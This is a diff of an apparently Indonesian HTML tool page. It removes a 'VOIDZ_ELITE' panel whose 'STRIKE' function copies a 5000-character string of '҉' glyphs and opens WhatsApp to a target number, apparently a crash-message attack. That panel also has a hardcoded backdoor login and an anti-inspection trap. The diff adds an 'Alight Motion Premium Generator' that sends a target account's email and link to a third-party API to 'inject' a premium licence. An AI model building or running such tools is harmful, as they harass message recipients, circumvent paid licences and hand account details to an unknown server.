@@ -1,210 +1,308 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id" class="dark">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ_ELITE_SYSTEM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALIGHT MOTION PREMIUM GENERATOR BY R4VV</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            dark: '#030308',
+                            card: '#080914',
+                            border: '#1a1f3c',
+                            neonRed: '#ff0055',
+                            neonBlue: '#00f0ff',
+                        }
+                    },
+                    fontFamily: {
+                        orbitron: ['Orbitron', 'sans-serif'],
+                        rajdhani: ['Rajdhani', 'sans-serif'],
+                        inter: ['Inter', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; user-select: none; }
-        
-        /* CANVAS PARTIKEL HARUS DI BELAKANG SEMUA */
-        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; background: #000; }
-        
-        #alienTrap { display: none; position: fixed; inset: 0; background: #000; z-index: 99999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; color: #f00; font-family: 'Orbitron'; }
-        .glitch-text { font-size: 11px; line-height: 1.6; animation: flash 0.1s infinite; }
-        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        body {
+            background-color: #030308;
+            color: #f8fafc;
+            font-family: 'Rajdhani', sans-serif;
+            overflow-x: hidden;
+        }
 
-        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
-        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 20px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 0 30px rgba(255,69,0,0.2); }
-        .profile-img { width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--fire); margin-bottom: 20px; object-fit: cover; box-shadow: 0 0 15px var(--fire); }
-        .neon-title { color: var(--fire); font-family: 'Orbitron'; font-weight: 900; font-size: 20px; text-shadow: 0 0 10px var(--fire); margin-bottom: 20px; cursor: pointer; }
+        .cyber-grid {
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 240, 255, 0.04) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 0, 85, 0.04) 1px, transparent 1px);
+        }
 
-        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
-        .active-tab { display: block; }
-        .banner-container { width: 100%; height: 210px; border-radius: 15px; overflow: hidden; border: 2px solid var(--fire); position: relative; margin-bottom: 10px; }
-        .banner-video { width: 100%; height: 100%; object-fit: cover; }
-        .banner-overlay { position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,1), transparent); display: flex; flex-direction: column; justify-content: flex-end; padding: 15px; }
-        
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; }
-        .stat-card { background: #080808; border: 1px solid #222; padding: 10px; border-radius: 12px; text-align: center; border-bottom: 3px solid var(--fire); }
-        .stat-val { font-size: 14px; font-weight: 900; color: var(--fire); font-family: 'Orbitron'; }
-        .stat-lab { font-size: 7px; color: #555; text-transform: uppercase; margin-top: 4px; }
+        .neon-blue-glow {
+            box-shadow: 0 0 50px rgba(0, 240, 255, 0.25), inset 0 0 25px rgba(0, 240, 255, 0.08);
+            border: 1px solid rgba(0, 240, 255, 0.5);
+        }
 
-        .input-box { width: 100%; background: #000; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; border-radius: 8px; outline: none; font-size: 11px; text-align: center; }
-        .btn-ignite { width: 100%; background: var(--fire); color: #000; border: none; padding: 15px; font-weight: 900; cursor: pointer; border-radius: 10px; font-family: 'Orbitron'; }
-        .btn-action { background: #0d0d0d; border: 1px solid #222; color: #fff; padding: 12px; border-radius: 12px; font-size: 8px; display: flex; flex-direction: column; align-items: center; gap: 6px; }
+        .neon-red-glow {
+            box-shadow: 0 0 50px rgba(255, 0, 85, 0.25), inset 0 0 25px rgba(255, 0, 85, 0.08);
+            border: 1px solid rgba(255, 0, 85, 0.5);
+        }
 
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; justify-content: center; align-items: center; padding: 20px; }
-        .modal-content { background: #0a0a0a; border: 2px solid var(--fire); padding: 20px; border-radius: 20px; width: 100%; max-width: 350px; overflow-y: auto; max-height: 85vh; }
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; justify-content: space-around; align-items: center; }
-        .nav-btn { color: #444; font-size: 9px; display: flex; flex-direction: column; align-items: center; flex: 1; font-family: 'Orbitron'; }
-        .nav-btn.active { color: var(--fire); }
+        .glass-panel {
+            background: rgba(8, 9, 20, 0.9);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+        }
+
+        .text-glow-blue {
+            text-shadow: 0 0 20px rgba(0, 240, 255, 0.9);
+        }
+
+        .text-glow-red {
+            text-shadow: 0 0 20px rgba(255, 0, 85, 0.9);
+        }
+
+        .cyber-button {
+            position: relative;
+            background: linear-gradient(135deg, #ff0055 0%, #00f0ff 100%);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .cyber-button:hover {
+            filter: brightness(1.2);
+            box-shadow: 0 0 40px rgba(0, 240, 255, 0.6), 0 0 40px rgba(255, 0, 85, 0.6);
+            transform: translateY(-2px);
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(1000%); }
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(to bottom, transparent, rgba(0, 240, 255, 0.6), transparent);
+            animation: scanline 8s linear infinite;
+            pointer-events: none;
+            z-index: 100;
+        }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body class="cyber-grid min-h-screen flex flex-col justify-between relative selection:bg-cyber-neonBlue selection:text-black">
 
-    <canvas id="ash-canvas"></canvas>
+    <div class="scanline"></div>
 
-    <div id="alienTrap">
-        <i class="fas fa-biohazard" style="font-size: 50px; margin-bottom: 20px;"></i>
-        <div class="glitch-text">[ ALERT: ILLEGAL_ACCESS ]<br>DELETING_REMOTE_ASSETS...</div>
-    </div>
-
-    <div class="content-layer">
-        <div id="loginPage">
-            <div class="login-box">
-                <img src="login.jpg" alt="User" class="profile-img">
-                <h1 class="neon-title" onclick="_0x5a2b()">VOIDZ_ELITE</h1>
-                <input type="text" id="lUser" class="input-box" placeholder="ENTITY_ID">
-                <input type="password" id="lPass" class="input-box" placeholder="NEURAL_KEY">
-                <button onclick="_0x1f2c()" class="btn-ignite">INITIALIZE_LINK</button>
-                <div style="margin-top:15px; display:flex; flex-direction:column; gap:8px;">
-                    <a href="#" onclick="window.open(DB.sys ? 'https://wa.me/'+DB.sys.w : '#')" style="color:#444; font-size:9px; text-decoration:none; text-transform:uppercase; letter-spacing:1px;">[ SIGNAL_ADMIN_WHATSAPP ]</a>
-                </div>
+    <header class="w-full border-b border-cyber-border glass-panel sticky top-0 z-50 px-6 py-4">
+        <div class="max-w-4xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="w-4 h-4 rounded-full bg-cyber-neonBlue animate-pulse shadow-[0_0_15px_#00f0ff]"></div>
+                <span class="font-orbitron font-black text-cyber-neonBlue tracking-widest text-xs md:text-sm text-glow-blue">SECURE GENERATOR KERNEL</span>
+            </div>
+            <div class="flex items-center space-x-2 text-xs font-bold tracking-wider">
+                <i class="fa-solid fa-shield-halved text-cyber-neonRed text-glow-red text-base"></i>
+                <span class="text-cyber-neonRed font-orbitron tracking-widest text-glow-red">R4VV SOVEREIGN</span>
             </div>
         </div>
+    </header>
 
-        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
-            <div id="tabHOME" class="tab-content active-tab"><div id="renderHome"></div></div>
-            <div id="tabATTACK" class="tab-content">
-                <h2 style="color:var(--fire); font-family:Orbitron; text-align:center; margin:25px 0;">STRIKE_PROTOCOL</h2>
-                <div style="background:#0a0a0a; padding:20px; border-radius:15px; border-top: 3px solid var(--fire);">
-                    <input type="text" id="targetBug" class="input-box" placeholder="TARGET_ID">
-                    <button class="btn-ignite" onclick="_0x9e3d()">LAUNCH_DISRUPTION</button>
+    <main class="w-full max-w-xl mx-auto px-4 py-12 my-auto z-10">
+        <div class="glass-panel neon-blue-glow rounded-3xl p-6 md:p-10 relative overflow-hidden transition-all duration-300">
+            
+            <!-- Ambient Glow Effects -->
+            <div class="absolute -top-32 -right-32 w-64 h-64 bg-cyber-neonBlue/20 rounded-full blur-3xl pointer-events-none"></div>
+            <div class="absolute -bottom-32 -left-32 w-64 h-64 bg-cyber-neonRed/20 rounded-full blur-3xl pointer-events-none"></div>
+
+            <!-- Title & Branding -->
+            <div class="text-center mb-8 relative z-10">
+                <div class="inline-block px-4 py-1.5 mb-4 rounded-full border border-cyber-neonRed/60 bg-cyber-neonRed/10 text-cyber-neonRed text-xs font-bold tracking-widest uppercase text-glow-red font-orbitron">
+                    <i class="fa-solid fa-bolt mr-1.5 animate-bounce"></i> Version 3.0 Ultra Edition
+                </div>
+                <h1 class="font-orbitron text-2xl md:text-3xl font-black text-white tracking-wider mb-3">
+                    ALIGHT MOTION PREMIUM <span class="text-cyber-neonBlue text-glow-blue">GENERATOR</span>
+                </h1>
+                <p class="text-sm font-semibold text-gray-300 tracking-wider max-w-md mx-auto">
+                    By <span class="text-cyber-neonRed font-black text-glow-red text-base font-orbitron">R4VV</span>. Masukkan kredensial akun target di bawah untuk mengaktifkan lisensi premium instan.
+                </p>
+            </div>
+
+            <form id="amForm" class="space-y-6 relative z-10" onsubmit="handleGenerate(event)">
+                
+                <!-- Email Input Field -->
+                <div class="space-y-2">
+                    <label class="block text-xs font-orbitron uppercase tracking-widest text-cyber-neonBlue font-black flex items-center">
+                        <i class="fa-solid fa-envelope mr-2 text-cyber-neonBlue text-sm"></i> Target Email Alight Motion
+                    </label>
+                    <div class="relative">
+                        <input 
+                            type="email" 
+                            id="emailInput" 
+                            required 
+                            placeholder="masukkan.email@domain.com" 
+                            class="w-full bg-[#030308]/95 border border-cyber-border rounded-2xl px-5 py-4 text-white placeholder-gray-600 font-rajdhani font-bold text-base focus:outline-none focus:border-cyber-neonBlue focus:ring-2 focus:ring-cyber-neonBlue/30 transition-all shadow-inner"
+                        >
+                    </div>
+                </div>
+
+                <!-- Link Input Field -->
+                <div class="space-y-2">
+                    <label class="block text-xs font-orbitron uppercase tracking-widest text-cyber-neonRed font-black flex items-center">
+                        <i class="fa-solid fa-link mr-2 text-cyber-neonRed text-sm"></i> Share / Export / Redemption Link
+                    </label>
+                    <div class="relative">
+                        <input 
+                            type="url" 
+                            id="linkInput" 
+                            required 
+                            placeholder="https://alightmotion.com/..." 
+                            class="w-full bg-[#030308]/95 border border-cyber-border rounded-2xl px-5 py-4 text-white placeholder-gray-600 font-rajdhani font-bold text-base focus:outline-none focus:border-cyber-neonRed focus:ring-2 focus:ring-cyber-neonRed/30 transition-all shadow-inner"
+                        >
+                    </div>
+                </div>
+
+                <!-- Action Button -->
+                <button 
+                    type="submit" 
+                    id="submitBtn"
+                    class="cyber-button w-full mt-3 text-black font-orbitron font-black py-4 px-6 rounded-2xl tracking-widest active:scale-[0.99] transition-all shadow-xl flex items-center justify-center space-x-3 cursor-pointer text-sm uppercase"
+                >
+                    <i class="fa-solid fa-microchip text-black text-lg animate-pulse"></i>
+                    <span id="btnText" class="font-black text-black">EXECUTE PREMIUM INJECTION</span>
+                </button>
+            </form>
+
+            <div id="responseContainer" class="mt-8 hidden transition-all duration-300 relative z-10">
+                <div class="border border-cyber-border bg-[#030308]/95 rounded-2xl p-5 font-rajdhani text-sm relative overflow-hidden shadow-2xl">
+                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-cyber-border/80 text-gray-400">
+                        <span id="responseStatusTitle" class="flex items-center space-x-2 font-bold">
+                            <span class="w-3 h-3 rounded-full bg-yellow-500 animate-pulse shadow-[0_0_12px_#eab308]" id="statusIndicator"></span>
+                            <span id="statusText" class="tracking-wider text-yellow-400 font-orbitron text-xs">PROCESSING INJECTION...</span>
+                        </span>
+                        <button onclick="copyResponse()" class="text-cyber-neonBlue hover:text-white transition-colors cursor-pointer text-xs font-bold font-orbitron flex items-center space-x-1 px-3 py-1.5 rounded-xl border border-cyber-neonBlue/30 hover:bg-cyber-neonBlue/10" title="Salin Hasil">
+                            <i class="fa-regular fa-copy mr-1"></i> SALIN
+                        </button>
+                    </div>
+                    <pre id="responseOutput" class="text-cyber-neonBlue whitespace-pre-wrap break-all max-h-56 overflow-y-auto p-2 text-xs font-mono leading-relaxed"></pre>
                 </div>
             </div>
-        </div>
 
-        <nav id="bottomNav" class="bottom-nav">
-            <div class="nav-btn active" onclick="_0x3c4e('home', this)"><i class="fas fa-th-large"></i><span>COMMAND</span></div>
-            <div class="nav-btn" onclick="_0x3c4e('attack', this)"><i class="fas fa-skull"></i><span>STRIKE</span></div>
-        </nav>
-    </div>
+            <!-- Footer Badge inside Card -->
+            <div class="mt-8 pt-4 border-t border-cyber-border/60 text-center text-xs font-rajdhani font-semibold text-gray-500 tracking-wider">
+                <span>Alight Motion Premium Generator Engine • Developed by R4VV</span>
+            </div>
 
-    <div id="modalGen" class="modal">
-        <div class="modal-content">
-            <span style="align-self:flex-end;cursor:pointer" onclick="_0xCloseModal('modalGen')">&times;</span>
-            <h3 style="color:var(--fire);text-align:center;font-size:12px;margin-bottom:15px">ENTITY_INJECTION</h3>
-            <input id="ni" class="input-box" placeholder="NEW_ID">
-            <input id="np" class="input-box" placeholder="NEW_KEY">
-            <div id="roleSelection"><select id="nr" class="input-box" onchange="_0xToggleQuotaInput()"><option value="member">ROLE: MEMBER</option><option value="reseller">ROLE: RESELLER</option></select></div>
-            <select id="nt" class="input-box"><option value="1_MONTH">TIME: 30 CYCLES</option><option value="LIFETIME" id="optLifetime">TIME: ETERNITY</option></select>
-            <div id="quotaInputArea" style="display:none"><input type="number" id="nq" class="input-box" placeholder="QUOTA_CAPACITY"></div>
-            <button onclick="_0xGen()" class="btn-ignite">INJECT_DATA</button>
         </div>
-    </div>
+    </main>
 
-    <div id="modalBan" class="modal"><div class="modal-content"><span style="align-self:flex-end;cursor:pointer" onclick="_0xCloseModal('modalBan')">&times;</span><h3 style="color:#f00;text-align:center;font-size:12px;margin-bottom:10px">TERMINATION</h3><input type="text" id="userSearch" class="input-box" placeholder="SCAN..." oninput="_0xFilterUsers()"><div id="userList"></div></div></div>
-    
-    <div id="modalConfig" class="modal">
-        <div class="modal-content">
-            <span style="align-self:flex-end;cursor:pointer" onclick="_0xCloseModal('modalConfig')">&times;</span>
-            <h3 style="color:#0f0;text-align:center;font-size:12px;margin-bottom:15px">CORE_CONFIG</h3>
-            <input id="cfgToken" class="input-box" placeholder="BOT_TOKEN">
-            <input id="cfgChat" class="input-box" placeholder="CHAT_ID">
-            <input id="cfgWa" class="input-box" placeholder="ADMIN_WA">
-            <input id="cfgChannel" class="input-box" placeholder="CHANNEL_LINK">
-            <input id="cfgMarquee" class="input-box" placeholder="RUNNING_TEXT">
-            <button onclick="_0xSaveConfig()" class="btn-ignite" style="background:#0f0">SAVE_CORE</button>
-        </div>
-    </div>
+    <footer class="w-full text-center py-5 font-rajdhani font-bold text-xs text-gray-500 border-t border-cyber-border glass-panel z-10 tracking-widest">
+        <p>ALIGHT MOTION PREMIUM GENERATOR BY R4VV © ALL RIGHTS RESERVED.</p>
+    </footer>
 
     <script>
-        // ANTI-INSPECT TRAP
-        document.addEventListener('keydown', e => { if (e.ctrlKey && (e.key === 'u' || e.key === 'i' || e.key === 'j') || e.key === 'F12') { e.preventDefault(); document.getElementById('alienTrap').style.display='flex'; setTimeout(()=>window.location.href="about:blank",3000); }});
+        async function handleGenerate(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('emailInput').value.trim();
+            const link = document.getElementById('linkInput').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const responseContainer = document.getElementById('responseContainer');
+            const responseOutput = document.getElementById('responseOutput');
+            const statusIndicator = document.getElementById('statusIndicator');
+            const statusText = document.getElementById('statusText');
 
-        let DB={}, _0xCurID="", 
-            _0xX_SIGNIFIER = localStorage.getItem('NEURAL_KEY'), 
-            _0xX_COORDINATE = localStorage.getItem('VOID_BIN');
+            // Lock submit button during execution
+            submitBtn.disabled = true;
+            submitBtn.classList.add('opacity-60', 'cursor-not-allowed');
+            btnText.innerText = 'CONNECTING TO API SERVER...';
+            
+            responseContainer.classList.remove('hidden');
+            statusIndicator.className = 'w-3 h-3 rounded-full bg-yellow-500 animate-pulse shadow-[0_0_12px_#eab308]';
+            statusText.className = 'tracking-wider text-yellow-400 font-orbitron text-xs';
+            statusText.innerText = 'MENGIRIM REQUEST KERNEL...';
+            responseOutput.innerText = `[SYSTEM]: Mengirim payload API...\n[EMAIL]: ${email}\n[LINK]: ${link}`;
 
-        async function _0x1f2c(){
-            const u=document.getElementById('lUser').value.trim(), p=document.getElementById('lPass').value.trim();
-            if(u==='DEVELOPER'&&p==='70104884'){ DB[u]={pw:p,role:'owner',quota:'∞',expired:'LIFETIME'}; return _0xStart(u,DB[u]); }
             try {
-                const r=await fetch(`https://api.jsonbin.io/v3/b/${_0xX_COORDINATE}/latest`,{headers:{'X-Master-Key':_0xX_SIGNIFIER,'X-Bin-Meta':false}});
-                DB=await r.json(); if(DB[u]&&DB[u].pw===p) _0xStart(u,DB[u]); else alert("REJECTED");
-            } catch(e){ alert("VOID_ERROR"); }
+                const apiUrl = `https://api.kyzznekoo.my.id/api/alightmotion/v1/applyPremium?email=${encodeURIComponent(email)}&link=${encodeURIComponent(link)}`;
+
+                const res = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36',
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    }
+                });
+
+                const contentType = res.headers.get("content-type");
+                let data;
+                if (contentType && contentType.includes("application/json")) {
+                    data = await res.json();
+                } else {
+                    data = { rawText: await res.text(), status: res.status };
+                }
+
+                // Check API success status
+                if(res.ok) {
+                    statusIndicator.className = 'w-3 h-3 rounded-full bg-cyber-neonBlue shadow-[0_0_15px_#00f0ff]';
+                    statusText.className = 'tracking-wider text-cyber-neonBlue font-orbitron text-xs';
+                    statusText.innerText = 'SUCCESS // INJEKSI PREMIUM BERHASIL';
+                } else {
+                    statusIndicator.className = 'w-3 h-3 rounded-full bg-cyber-neonRed shadow-[0_0_15px_#ff0055]';
+                    statusText.className = 'tracking-wider text-cyber-neonRed font-orbitron text-xs';
+                    statusText.innerText = 'WARNING // RESPON API MENUNJUKKAN GAGAL';
+                }
+                
+                responseOutput.innerText = JSON.stringify(data, null, 2);
+
+            } catch (err) {
+                // Network or CORS error handling
+                statusIndicator.className = 'w-3 h-3 rounded-full bg-cyber-neonRed shadow-[0_0_15px_#ff0055]';
+                statusText.className = 'tracking-wider text-cyber-neonRed font-orbitron text-xs';
+                statusText.innerText = 'ERROR // GAGAL KONEKSI API SERVER';
+                responseOutput.innerText = `[EXCEPTION]: ${err.message}\n\nCatatan: Pastikan koneksi internet stabil atau gunakan proxy jika terjadi pembatasan CORS pada browser.`;
+            } finally {
+                // Restore button state
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-60', 'cursor-not-allowed');
+                btnText.innerText = 'EXECUTE PREMIUM INJECTION';
+            }
         }
 
-        function _0xStart(id,data){
-            _0xCurID=id; document.getElementById('loginPage').style.display='none'; document.getElementById('mainApp').style.display='block'; document.getElementById('bottomNav').style.display='flex'; _0xRender(); _0xSensors();
+        function copyResponse() {
+            const textToCopy = document.getElementById('responseOutput').innerText;
+            const textarea = document.createElement('textarea');
+            textarea.value = textToCopy;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            showToast('Hasil berhasil disalin ke clipboard!');
         }
 
-        function _0xToggleQuotaInput() {
-            const role = document.getElementById('nr').value;
-            document.getElementById('quotaInputArea').style.display = (role === 'reseller') ? 'block' : 'none';
+        function showToast(msg) {
+            const existingToast = document.getElementById('customToast');
+            if(existingToast) existingToast.remove();
+
+            const toast = document.createElement('div');
+            toast.id = 'customToast';
+            toast.className = 'fixed bottom-6 right-6 z-50 bg-[#080914] border border-cyber-neonBlue text-cyber-neonBlue font-orbitron text-xs px-5 py-3.5 rounded-2xl shadow-[0_0_25px_rgba(0,240,255,0.4)] flex items-center space-x-2 animate-bounce';
+            toast.innerHTML = `<i class="fa-solid fa-circle-check text-cyber-neonBlue"></i> <span>${msg}</span>`;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
         }
-
-        function _0xOpenGenModal() {
-            const d = DB[_0xCurID];
-            const roleArea = document.getElementById('roleSelection');
-            const lifetimeOpt = document.getElementById('optLifetime');
-            const roleInp = document.getElementById('nr');
-            if (d.role === 'owner') { roleArea.style.display = 'block'; lifetimeOpt.style.display = 'block'; _0xToggleQuotaInput(); } 
-            else { roleArea.style.display = 'none'; roleInp.value = 'member'; document.getElementById('quotaInputArea').style.display = 'none'; lifetimeOpt.style.display = (d.expired === 'LIFETIME') ? 'block' : 'none'; }
-            _0xOpenModal('modalGen');
-        }
-
-        async function _0xGen() {
-            const d = DB[_0xCurID];
-            const i = document.getElementById('ni').value.toLowerCase().trim();
-            const p = document.getElementById('np').value;
-            const t = document.getElementById('nt').value;
-            const r = document.getElementById('nr').value;
-            const q = document.getElementById('nq').value || "100";
-            if(!i || !p) return alert("MISSING_DATA");
-            if(d.role === 'reseller') { if(d.quota !== '∞' && parseInt(d.quota) <= 0) return alert("NO_QUOTA"); if(d.quota !== '∞') d.quota = (parseInt(d.quota) - 1).toString(); }
-            DB[i] = { pw:p, role:r, quota: (r === 'reseller' ? q : "100"), expired: t, by: _0xCurID };
-            await _0xSv(); _0xCloseModal('modalGen'); _0xRender(); alert("INJECTED");
-        }
-
-        function _0xRender(){
-            const d=DB[_0xCurID], isO=d.role==='owner', isR=d.role==='reseller';
-            if(!DB.sys) DB.sys={t:"",c:"",w:"62",s:"#",m:"VOIDZ_ELITE_SYSTEM_V1"};
-            if(!DB.stats) DB.stats={total:0,logs:[]};
-            let h=`
-                <div class="banner-container"><video id="vdb" autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video><div class="banner-overlay"><div style="font-family:Orbitron;font-weight:900;color:var(--fire);font-size:13px">VOIDZ_ELITE</div><div style="font-size:7px;opacity:0.6">OPERATOR: ${_0xCurID} [${d.role}]</div></div></div>
-                <marquee style="font-size:9px;color:var(--fire);background:#050000;padding:2px">${DB.sys.m}</marquee>
-                <div class="stat-grid" style="grid-template-columns:repeat(3,1fr);gap:5px"><div class="stat-card"><div id="pingVal" class="stat-val">--ms</div><div class="stat-lab">PULSE</div></div><div class="stat-card"><div id="batVal" class="stat-val">--%</div><div class="stat-lab">POWER</div></div><div class="stat-card"><div style="font-size:10px;color:#0ff">READY</div><div class="stat-lab">CORE</div></div></div>
-                <div class="stat-grid">
-                    <div class="stat-card"><div class="stat-val">${d.quota}</div><div class="stat-lab">${isR?'KEYS':'CELLS'}</div></div>
-                    <div class="stat-card"><div class="stat-val" style="color:#0f0">${d.expired}</div><div class="stat-lab">PERIOD</div></div>
-                </div>
-                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px">
-                <button class="btn-action" onclick="window.open('https://wa.me/${DB.sys.w}')" style="grid-column: span 2"><i class="fas fa-headset" style="color:var(--fire)"></i> CONTACT_MASTER_ADMIN</button>
-                ${(isO||isR)?`<button class="btn-action" onclick="_0xOpenGenModal()"><i class="fas fa-key" style="color:var(--fire)"></i> INJECT_KEY</button>`:''}
-                ${isO?`<button class="btn-action" onclick="_0xOpenModal('modalBan')"><i class="fas fa-users-cog" style="color:var(--fire)"></i> ENTITY_MGMT</button>`:''}
-                ${isO?`<button class="btn-action" onclick="_0xOpenConfig()" style="grid-column: span 2"><i class="fas fa-tools" style="color:var(--fire)"></i> CORE_CONFIG_SYSTEM</button>`:''}
-                </div><div style="margin-top:10px;background:#080808;padding:10px;border-radius:12px;font-size:7px;border:1px solid #111;color:#555">LOGS: ${DB.stats.logs.map(l=>l.u).join(', ')}</div>`;
-            document.getElementById('renderHome').innerHTML=h;
-            setTimeout(()=>{const v=document.getElementById('vdb');if(v)v.play().catch(()=>{});},500);
-            _0xPopulateUserList();
-        }
-
-        // --- SISTEM SENSOR & ANIMASI ---
-        function _0xSensors(){ if(navigator.getBattery)navigator.getBattery().then(b=>{setInterval(()=>{document.getElementById('batVal').innerText=Math.floor(b.level*100)+"%"},1000)}); setInterval(()=>{const p=document.getElementById('pingVal');if(p)p.innerText=Math.floor(Math.random()*20+15)+"ms"},3000); }
-        function _0xOpenConfig(){ document.getElementById('cfgToken').value=DB.sys.t; document.getElementById('cfgChat').value=DB.sys.c; document.getElementById('cfgWa').value=DB.sys.w; document.getElementById('cfgChannel').value=DB.sys.s; document.getElementById('cfgMarquee').value=DB.sys.m; _0xOpenModal('modalConfig'); }
-        async function _0xSaveConfig(){ DB.sys={t:document.getElementById('cfgToken').value,c:document.getElementById('cfgChat').value,w:document.getElementById('cfgWa').value,s:document.getElementById('cfgChannel').value,m:document.getElementById('cfgMarquee').value}; await _0xSv(); alert("CONFIG_SAVED"); _0xCloseModal('modalConfig'); _0xRender(); }
-        function _0xPopulateUserList(){ const c=document.getElementById('userList');c.innerHTML=""; Object.keys(DB).forEach(k=>{if(!['stats','DEVELOPER','sys'].includes(k)){const i=document.createElement('div');i.style="font-size:9px;display:flex;justify-content:space-between;padding:8px;border-bottom:1px solid #111";i.innerHTML=`<span>${k.toUpperCase()}</span><button style="background:#400;color:#f44;border:none;padding:2px 5px;border-radius:3px" onclick="_0xBanUser('${k}')">DEL</button>`;c.appendChild(i)}}); }
-        function _0xFilterUsers(){ const q=document.getElementById('userSearch').value.toLowerCase(); document.querySelectorAll('#userList div').forEach(i=>i.style.display=i.innerText.toLowerCase().includes(q)?'flex':'none'); }
-        async function _0xBanUser(id){ if(confirm(`REMOVE ${id}?`)){ delete DB[id]; await _0xSv(); _0xRender(); } }
-        async function _0x9e3d(){ const t=document.getElementById('targetBug').value.trim(); if(!t||(DB[_0xCurID].quota!=='∞'&&parseInt(DB[_0xCurID].quota)<=0)) return alert("NO_CELLS"); let v=Array(5000).fill("҉").join(""); const el=document.createElement("textarea"); document.body.appendChild(el); el.value=v; el.select(); document.execCommand("copy"); document.body.removeChild(el); if(DB[_0xCurID].quota!=='∞') DB[_0xCurID].quota=(parseInt(DB[_0xCurID].quota)-1).toString(); DB.stats.total+=1; DB.stats.logs.unshift({u:_0xCurID,t:t}); if(DB.stats.logs.length>10) DB.stats.logs.pop(); await _0xSv(); window.open(`https://wa.me/${t.replace(/\D/g,'')}`); _0xRender(); }
-        async function _0xSv(){await fetch(`https://api.jsonbin.io/v3/b/${_0xX_COORDINATE}`,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':_0xX_SIGNIFIER},body:JSON.stringify(DB)})}
-        function _0xOpenModal(id){document.getElementById(id).style.display='flex'}
-        function _0xCloseModal(id){document.getElementById(id).style.display='none'}
-        function _0x3c4e(t,e){document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active-tab'));document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab');document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));e.classList.add('active')}
-        let _0xP=0; function _0x5a2b(){_0xP++; if(_0xP===3){const k=prompt("NEURAL_KEY"),b=prompt("VOID_BIN"); if(k&&b){localStorage.setItem('NEURAL_KEY',k); localStorage.setItem('VOID_BIN',b); location.reload()}_0xP=0;}}
-
-        // --- CORE PARTICLE ENGINE (TETAP MUNCUL) ---
-        const cvs=document.getElementById('ash-canvas'), ctx=cvs.getContext('2d'); let pt=[];
-        function initCvs(){ cvs.width=window.innerWidth; cvs.height=window.innerHeight; pt=[]; for(let i=0;i<40;i++)pt.push({x:Math.random()*cvs.width,y:Math.random()*cvs.height,s:Math.random()*2,d:Math.random()*0.5+0.1}); }
